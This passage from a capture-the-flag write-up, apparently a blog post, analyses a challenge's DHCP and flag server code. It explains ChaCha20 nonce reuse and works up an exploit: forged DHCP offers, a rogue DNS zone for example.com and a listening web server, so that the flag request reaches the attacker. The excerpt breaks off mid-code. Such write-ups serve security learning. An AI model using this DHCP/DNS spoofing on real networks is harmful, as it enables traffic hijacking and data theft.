<span class="hljs-title function_">process_pkt</span>(<span class="hljs-params">self, pkt</span>):<br>    <span class="hljs-keyword">assert</span> pkt <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br><br>    src_mac = pkt[:<span class="hljs-number">6</span>]<br>    dst_mac = pkt[<span class="hljs-number">6</span>:<span class="hljs-number">12</span>]<br>    msg = pkt[<span class="hljs-number">12</span>:]<br><br>    <span class="hljs-keyword">if</span> dst_mac != self.mac:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> src_mac == self.mac:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(msg) <span class="hljs-keyword">and</span> msg.startswith(<span class="hljs-string">b&quot;\x01&quot;</span>):<br>        <span class="hljs-comment"># lease request</span><br>        dev_name = msg[<span class="hljs-number">1</span>:]<br>        lease_resp = self.get_lease(dev_name)<br>        <span class="hljs-keyword">return</span> (<br>            self.mac +<br>            src_mac + <span class="hljs-comment"># dest mac</span><br>            lease_resp<br>        )<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure></li></ul><p>The <code>get_lease</code> function, which processes the <strong>DHCP discovery message</strong>, will try to handout any unused IP address from the <code>ips</code>-list first and if all of them are in use, it will relinquish the oldest lease and reuse and handout that same IP address once more.</p><p><strong>Note</strong>: If an actual DHCP server was to behave like this, modern networks would break all the time, because multiple devices would use the same IP address, which is supposed to be unique to a single device for the timeframe of the lease, which this DhcpServer implementation does not respect.</p><p>Finally this function will construct a response packet similar to a <strong>DHCP offer message</strong>, even replying with some of the possible <strong>DHCP options</strong>.</p><ul><li>The main difference from the official <strong>DHCP protocol</strong> is that the majority of the response is encrypted. Additionally, a checksum computed on the unencrypted packet is appended to the end of the response.</li><li>Another notable piece of information are the two DNS server IP addresses given inside the response packet, which are statically set to <code>8.8.8.8</code> and <code>8.8.4.4</code> by the <strong>DhcpServer</strong>. We’ll come back to this when analyzing the FlagServer.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_lease</span>(<span class="hljs-params">self, dev_name</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.ips) != <span class="hljs-number">0</span>:<br>        ip = self.ips.pop(<span class="hljs-number">0</span>)<br>        self.leases.append((ip, dev_name, time.time(), []))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># relinquish the oldest lease</span><br>        old_lease = self.leases.pop(<span class="hljs-number">0</span>)<br>        ip = old_lease[<span class="hljs-number">0</span>]<br>        self.leases.append((ip, dev_name, time.time(), []))<br><br>    pkt = <span class="hljs-built_in">bytearray</span>(<br>        <span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ip.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>        <span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> self.gateway_ip.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>        <span class="hljs-built_in">bytes</span>([<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>]) +<br>        <span class="hljs-built_in">bytes</span>([<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>]) +<br>        <span class="hljs-built_in">bytes</span>([<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>]) +<br>        dev_name +<br>        <span class="hljs-string">b&quot;\x00&quot;</span><br>    )<br><br>    pkt = <span class="hljs-string">b&quot;\x02&quot;</span> + encrypt_msg(pkt, self.get_entropy_from_lavalamps()) + calc_crc(pkt)<br><br>    <span class="hljs-keyword">return</span> pkt<br></code></pre></td></tr></table></figure>Taking a deeper dive into the packet encryption, we’ll notice two things:</li></ul><ol><li>The <code>dev_name</code> part of the response packet is fully controlled by the sender of the <strong>DHCP discovery message</strong>, as we’ll see when analyzing the <strong>FlagServer</strong> and the intended structure of such a discovery message. The only pseudo restriction on this part is a trailing <code>0x00</code>-byte, which the sender is not supposed to change, but there’s no actual check for that byte.</li><li>The <code>nonce</code> passed into the <code>encrypt_msg</code> function is generated using the <code>get_entropy_from_lavalamps</code> function, which we’ll take a look at right now:</li></ol><p>There are two cases for this function:</p><ol><li>If the <strong>DhcpServer</strong> instance does not contain an active <code>lease</code> for a server containing <code>rngserver</code> in the server name, then the <code>get_entropy_from_lavalamps</code> function will just return <code>sha256(RNG_INIT)</code>.</li><li>On the other hand, if the <strong>DhcpServer</strong> does contain an active <code>lease</code> for a server containing <code>rngserver</code> in its name, then the result of the <code>get_entropy_from_lavalamps</code> function will be altered by appending some additional data to the argument of the SHA256 computation.</li></ol><p>Thus, for the sake of simplicity, we should try to achieve the first case and get a static return value from this funtion to incur a <strong>key and nonce reuse</strong> in the <code>encrypt_msg</code> function. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_entropy_from_lavalamps</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># Get entropy from all available lava-lamp RNG servers</span><br>    <span class="hljs-comment"># Falling back to local RNG if necessary</span><br>    entropy_pool = RNG_INIT<br><br>    <span class="hljs-keyword">for</span> ip, name, ts, tags <span class="hljs-keyword">in</span> self.leases:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;rngserver&quot;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment"># get entropy from the server</span><br>                output = requests.get(<span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;ip&#125;</span>/get_rng&quot;</span>, timeout=TIMEOUT).text<br>                entropy_pool += sha256(output.encode())<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-comment"># if the server is broken, get randomness from local RNG instead</span><br>                entropy_pool += sha256(secrets.token_bytes(<span class="hljs-number">512</span>))<br><br>    <span class="hljs-keyword">return</span> sha256(entropy_pool)<br></code></pre></td></tr></table></figure><h3 id="FlagServer"><a href="#FlagServer" class="headerlink" title="FlagServer"></a>FlagServer</h3><p>Finally let’s analyze the <strong>FlagServer</strong>:</p><p>Similarly to the <strong>DhcpServer</strong>, the <strong>FlagServer</strong> also initializes its own <strong>MAC address</strong>. Additionally it sets up its own <strong>DNS resolver</strong> and initializes this <code>dns</code> instance and its own network settings by talking to the <strong>DhcpServer</strong> and asking it for the appropriate settings.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FlagServer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, dhcp</span>):<br>        self.mac = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;53 79 82 b5 97 eb&quot;</span>)<br>        self.dns = dns.resolver.Resolver()<br>        self.process_pkt(dhcp.process_pkt(self.mac+dhcp.mac+<span class="hljs-string">b&quot;\x01&quot;</span>+<span class="hljs-string">b&quot;flag_server&quot;</span>))<br></code></pre></td></tr></table></figure><p>The <strong>FlagSever</strong> is going to process the response of the <strong>DhcpServer</strong> using its own <code>process_pkt</code> function. This function, similar to the <strong>DhcpServer</strong>‘s analogue, also parses the first 12 bytes into two different <strong>MAC addresses</strong> and checks those to see if it even has to process the received packet - in the same way, the <strong>DhcpServer</strong> does. And again, the remainder of the packet data is being considered the actual message part of the packet.</p><p>Besides that, the <strong>FlagServer</strong> can execute two functions depending on the incoming message <code>msg</code>.</p><ul><li>If the <code>msg</code> starts with a <code>0x02</code>-byte, it will parse and process the supplied <strong>DHCP offer message</strong>:<ol><li>After stripping the static <code>0x02</code>-byte from the front and the checksum from the end of the message, the <strong>FlagServer</strong> decrypts the provided ciphertext packet <code>pkt</code> and veryfies the contained <code>tag</code> using the also contianed <code>nonce</code> and the previously defined <code>decrypt_msg</code> function with the shared static encryption key <code>CHACHA_KEY</code>.</li><li>After decrypting the <strong>DHCP offer message</strong> <code>pkt</code>, the <strong>FlagServer</strong> also verifies the <strong>checksum</strong> attached to the message.</li><li>If all the checks pass, the <strong>FlagServer</strong> will then continue to configure its own settings based on the <strong>DHCP offer message</strong> and also configure their <code>dns</code> server to use the supplied <strong>DNS server ip addresses</strong>.</li></ol></li><li>If the <code>msg</code> starts with a <code>0x03</code>-byte, then the <strong>FlagServer</strong> is reading the file <code>flag.txt</code> and sending a http <strong>GET</strong> request to <code>http://example.com/&#123;flag&#125;</code> using its own <strong>DNS server</strong>.</li><li>Any other message will be rejected by this server.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_pkt</span>(<span class="hljs-params">self, pkt</span>):<br>    <span class="hljs-keyword">assert</span> pkt <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br><br>    src_mac = pkt[:<span class="hljs-number">6</span>]<br>    dst_mac = pkt[<span class="hljs-number">6</span>:<span class="hljs-number">12</span>]<br>    msg = pkt[<span class="hljs-number">12</span>:]<br><br>    <span class="hljs-keyword">if</span> dst_mac != self.mac:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> src_mac == self.mac:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(msg) <span class="hljs-keyword">and</span> msg.startswith(<span class="hljs-string">b&quot;\x02&quot;</span>):<br>        <span class="hljs-comment"># lease response</span><br>        pkt = msg[<span class="hljs-number">1</span>:-<span class="hljs-number">4</span>]<br>        pkt = decrypt_msg(pkt)<br>        crc = msg[-<span class="hljs-number">4</span>:]<br>        <span class="hljs-keyword">assert</span> crc == calc_crc(pkt)<br><br>        self.ip = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>        self.gateway_ip = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>])<br>        self.subnet_mask = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>])<br>        self.dns1 = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>])<br>        self.dns2 = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">16</span>:<span class="hljs-number">20</span>])<br>        self.dns.nameservers = [self.dns1, self.dns2]<br>        <span class="hljs-keyword">assert</span> pkt.endswith(<span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FLAG SERVER] [DEBUG] Got DHCP lease&quot;</span>, self.ip, self.gateway_ip, self.subnet_mask, self.dns1, self.dns2)<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(msg) <span class="hljs-keyword">and</span> msg.startswith(<span class="hljs-string">b&quot;\x03&quot;</span>):<br>        <span class="hljs-comment"># FREE FLAGES!!!!!!!</span><br>        self.send_flag()<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_flag</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        flag = f.read().strip()<br>    curl(<span class="hljs-string">&quot;example.com&quot;</span>, <span class="hljs-string">f&quot;/<span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>, self.dns)<br></code></pre></td></tr></table></figure></li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>After puzzling all of the pieces together, we are left with a clear plan of action:</p><ol><li>Forge a <strong>DHCP offer message</strong> and send it to the <strong>FlagServer</strong> to reconfigure their <strong>DNS server</strong> settings and have them point to us.</li><li>Setup our own <strong>DNS server</strong>, which maliciously tells the <strong>FlagServer</strong> that the domain <code>example.com</code> also belongs to us.</li><li>Setup our own web server, which is supposed to receive the messages send to <code>example.com</code> - coming from the <strong>FlagServer</strong>.</li><li>Send an other request to the <strong>FlagServer</strong> - this time using the <code>0x03</code>-byte message type - to make the <strong>FlagServer</strong> send the flag to, what they think is, <code>example.com</code>, i.e. us.</li><li>Receive the flag.</li></ol><p>Now let’s explore the details of each of those steps in a slightly different order - we’ll start off by setting up the required infrastructure:</p><h3 id="The-infrastructure"><a href="#The-infrastructure" class="headerlink" title="The infrastructure"></a>The infrastructure</h3><h4 id="1-Our-DNS-server"><a href="#1-Our-DNS-server" class="headerlink" title="1. Our DNS server"></a>1. Our DNS server</h4><p>To be able to receive the flag, we’ll need to trick the <strong>FlagServer</strong> into thinking we’re their actual <strong>DNS server</strong>, such that we can also tell it that all the requests meant for <code>example.com</code> should be send to us - including the flag!</p><p>So let’s set up our own <strong>DNS server</strong>, using a somewhat easy to configure DNS-Server implemented in python, that perfectly suits our needs:</p><h4 id="1-1-Clone-the-respective-git-repository"><a href="#1-1-Clone-the-respective-git-repository" class="headerlink" title="1.1. Clone the respective git repository:"></a>1.1. Clone the respective git repository:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> https://github.com/akapila011/DNS-Server.git &amp;&amp; <span class="hljs-built_in">cd</span> DNS-Server/<br></code></pre></td></tr></table></figure><h4 id="1-2-Configure-the-server-to-run-on-the-appropriate-ip-address"><a href="#1-2-Configure-the-server-to-run-on-the-appropriate-ip-address" class="headerlink" title="1.2. Configure the server to run on the appropriate ip address:"></a>1.2. Configure the server to run on the appropriate ip address:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ vim Server.py<br></code></pre></td></tr></table></figure><p>I’m running the entire exploit on a Kali virtual machine, which is configured to be <strong>bridged</strong> on my host machine, thus I’ll have to use my <code>eth0</code>-interface ip <code>192.168.178.79</code> of that VM in this case.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">from</span> dns_generator <span class="hljs-keyword">import</span> ClientHandler<br><br><span class="hljs-comment"># Global variables</span><br>IP = <span class="hljs-string">&quot;192.168.178.79&quot;</span> <span class="hljs-comment"># &lt;-- Change this ip address to suit your needs</span><br>PORT = <span class="hljs-number">53</span> <span class="hljs-comment"># Default UPD port number for DNS; don&#x27;t change this without knowingwhat you&#x27;re doing, otherwise the FlagServer might not be able to reach you.</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>    sock.bind((IP, PORT))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;DNS Listening on &#123;0&#125;:&#123;1&#125; ...&quot;</span>.<span class="hljs-built_in">format</span>(IP, PORT))<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        data, address = sock.recvfrom(<span class="hljs-number">650</span>)<br>        client = ClientHandler(address, data, sock)<br>        client.run()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h4 id="1-3-Configure-a-Zone-file-for-the-example-com-domain-such-that-the-DNS-server-will-actually-respond-to-requests-for-example-com-and-will-return-our-public-ip-address"><a href="#1-3-Configure-a-Zone-file-for-the-example-com-domain-such-that-the-DNS-server-will-actually-respond-to-requests-for-example-com-and-will-return-our-public-ip-address" class="headerlink" title="1.3. Configure a Zone file for the example.com domain, such that the DNS server will actually respond to requests for example.com and will return our public ip address:"></a>1.3. Configure a <strong>Zone</strong> file for the <code>example.com</code> domain, such that the <strong>DNS server</strong> will actually respond to requests for <code>example.com</code> and will return our public ip address:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ vim ./Zones/example.com.zone<br></code></pre></td></tr></table></figure><p>Replace the ip address <code>127.0.0.1</code> in the <strong>A record</strong> with your public iaddress! <strong>Note</strong>, in my setup, this is not the same as the ip address used fomy virtual machine!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>    <span class="hljs-string">&quot;<span class="hljs-variable">$origin</span>&quot;</span>: <span class="hljs-string">&quot;example.com&quot;</span>,<br>    <span class="hljs-string">&quot;<span class="hljs-variable">$ttl</span>&quot;</span>: 3600,<br><br>    <span class="hljs-string">&quot;a&quot;</span>: [<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;@&quot;</span>,<br>        <span class="hljs-string">&quot;ttl&quot;</span>: 400,<br>        <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-4-Running-the-DNS-server"><a href="#1-4-Running-the-DNS-server" class="headerlink" title="1.4. Running the DNS server"></a>1.4. Running the <strong>DNS server</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo python ./Server.py<br></code></pre></td></tr></table></figure><h4 id="2-Our-web-server"><a href="#2-Our-web-server" class="headerlink" title="2. Our web server"></a>2. Our web server</h4><p>Running our own web server is as simple as running the following command:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">$ python -m http.server <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><h4 id="3-Port-forwarding"><a href="#3-Port-forwarding" class="headerlink" title="3. Port forwarding"></a>3. Port forwarding</h4><p>If you’re sitting behind a firewall, you’ll need to configure it to forward the ports following ports to your machine - in my case to the VM: <code>80/tcp</code> and <code>53/udp</code>. Based on your firewall&#x2F;hardware configuration, you’ll have to find your own instructions on how to do this.</p><h3 id="The-logic"><a href="#The-logic" class="headerlink" title="The logic"></a>The logic</h3><h4 id="4-Forge-a-DHCP-offer-message-and-send-it-to-the-FlagServer-to-reconfigure-their-DNS-server-settings-and-have-them-point-to-us"><a href="#4-Forge-a-DHCP-offer-message-and-send-it-to-the-FlagServer-to-reconfigure-their-DNS-server-settings-and-have-them-point-to-us" class="headerlink" title="4. Forge a DHCP offer message and send it to the FlagServer to reconfigure their DNS server settings and have them point to us"></a>4. Forge a <strong>DHCP offer message</strong> and send it to the <strong>FlagServer</strong> to reconfigure their <strong>DNS server</strong> settings and have them point to us</h4><p>To reconfigure the DNS settings of the <strong>FlagServer</strong>, we need to forge a packet that’s supposedly encrypted and signed by the <strong>DhcpServer</strong> such that the <strong>FlagServer</strong> will successfully decrypt and verify the signature of it to reconfigure their own DNS settings.</p><h4 id="4-1-Retrieve-a-KeyStream-of-the-desired-length-including-the-corresponding-nonce-that-we-want-to-reuse"><a href="#4-1-Retrieve-a-KeyStream-of-the-desired-length-including-the-corresponding-nonce-that-we-want-to-reuse" class="headerlink" title="4.1. Retrieve a KeyStream of the desired length including the corresponding nonce, that we want to reuse"></a>4.1. Retrieve a <strong>KeyStream</strong> of the desired length including the corresponding <code>nonce</code>, that we want to reuse</h4><p>Remembering our analysis of the <code>encrypt_msg</code> function, we’ve noticed a couple of important things about the key and the nonce, both of which are used to compute the final <strong>KeyStream</strong> in the <strong>ChaCha20</strong> cipher.</p><p>The cipher key is shared between the encryption on the <strong>DhcpServer</strong> and the decryption on the <strong>FlagServer</strong>, so we don’t have to worry about that one, if we can retrieve the <strong>KeyStream</strong> somehow.</p><p>The final nonce for the encryption is computed using the first 32 bytes of each the packet content and the primary nonce created by the <code>get_entropy_from_lavalamps</code> function.</p><p>So let’s take an other look at the <code>get_entropy_from_lavalamps</code> function. If we can manage to remove all leases, that contain the string <code>rngserver</code> in their name, we can assure a static primary nonce. To do so, we’ll define a short packet, that fit’s our needs to request a lease from the <strong>DhcpServer</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">dhcp_req_pkt = <span class="hljs-built_in">bytearray</span>(<br>flag_server_mac + <span class="hljs-comment"># src mac = &lt;YOUR_MAC&gt;</span><br>dhcp_server_mac + <span class="hljs-comment"># dst mac = &quot;1b 7d 6f 49 37 c9&quot;</span><br><span class="hljs-comment"># msg:</span><br><span class="hljs-string">b&#x27;\x01&#x27;</span> + <span class="hljs-comment"># DHCP request</span><br><span class="hljs-string">b&#x27;&#x27;</span>     + <span class="hljs-comment"># rest of msg</span><br><span class="hljs-string">b&#x27;\x00&#x27;</span><br>)<br></code></pre></td></tr></table></figure><p>We can also verify that packets received from the <strong>DhcpServer</strong> matches the expected IP addresses by computing the crc32 values for the expected packet for all the possible IPs and comparing the precomputed crc32 values to the crc32 value appended to the message sent by the <strong>DhcpServer</strong>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">crc32s = &#123;&#125; <span class="hljs-comment"># hex(crc32) -&gt; leased ip</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">precompute_crc32</span>(<span class="hljs-params">dhcp_req_pkt</span>):<br><span class="hljs-keyword">global</span> crc32s<br><span class="hljs-comment"># precompute answer-crc32s:</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">64</span>): <span class="hljs-comment"># needs 2, because if you kick rngserver_0 out of the leases, then IP 192.168.1.2 is used!</span><br>ip = <span class="hljs-string">f&#x27;192.168.1.<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span><br>crc_pkt = <span class="hljs-built_in">bytearray</span>(<br><span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ip.split(<span class="hljs-string">&#x27;.&#x27;</span>)]) +<br><span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;192.168.1.1&#x27;</span>.split(<span class="hljs-string">&#x27;.&#x27;</span>)]) +<br><span class="hljs-built_in">bytes</span>([<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>]) +<br><span class="hljs-built_in">bytes</span>([<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>]) +<br><span class="hljs-built_in">bytes</span>([<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>]) +<br>dhcp_req_pkt[<span class="hljs-number">12</span>+<span class="hljs-number">1</span>:] +<br><span class="hljs-string">b&quot;\x00&quot;</span><br>)<br>crc32s[binascii.hexlify(calc_crc(crc_pkt)).decode()] = ip<br></code></pre></td></tr></table></figure><p>And let’s just setup a small function to send the crafted packets to the <strong>DhcpServer</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">request_ip_from_dhcp</span>(<span class="hljs-params">flag_print = <span class="hljs-literal">False</span>, dhcp_req_pkt = dhcp_req_pkt</span>):<br><span class="hljs-string">&#x27;&#x27;&#x27;Requests an IP from the DHCP and returns it.&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">global</span> crc32s<br><span class="hljs-comment"># prompt</span><br>prompt = conn.readuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>).decode()<br><span class="hljs-comment">#print(prompt, end=&#x27;&#x27;)</span><br><span class="hljs-comment"># send ip lease request to DHCP Server</span><br>hex_req = binascii.hexlify(dhcp_req_pkt)<br><span class="hljs-comment">#print(&#x27;dhcp packet request:&#x27;, hex_req.decode())</span><br>conn.sendline(hex_req)<br><span class="hljs-comment"># read response:</span><br>resp = conn.readline().decode().strip()<br><span class="hljs-comment">#print(&#x27;resp&#x27;, resp)</span><br>resp_distant_mac = resp[:<span class="hljs-number">12</span>] <span class="hljs-comment"># dhcp mac</span><br><span class="hljs-comment">#print(&#x27;resp_distant_mac&#x27;, resp_distant_mac)</span><br>resp_my_mac = resp[<span class="hljs-number">12</span>:<span 